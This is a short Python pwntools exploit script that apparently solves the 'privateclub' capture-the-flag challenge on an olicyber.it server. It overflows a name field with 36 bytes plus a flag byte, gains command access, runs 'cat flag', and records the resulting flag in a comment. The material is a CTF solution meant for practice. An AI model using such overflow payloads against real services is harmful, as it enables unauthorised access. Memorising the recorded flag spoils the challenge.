from pwn import *
import re

host = "privateclub.challs.olicyber.it"
port = 10015

r = remote(host,port)

payload = b"A" * 36 + b"\x01"

r.recvuntil(b"Quanti anni hai?")
r.sendline(b"18")
r.recvuntil(b"Come ti chiami?")
r.sendline(payload)
r.recvuntil(b"bentornato :)")
r.sendline(b"cat flag")
data = r.recvuntil(b"}")
print(data.decode())
r.close()

#flag{b4d_sc4nf}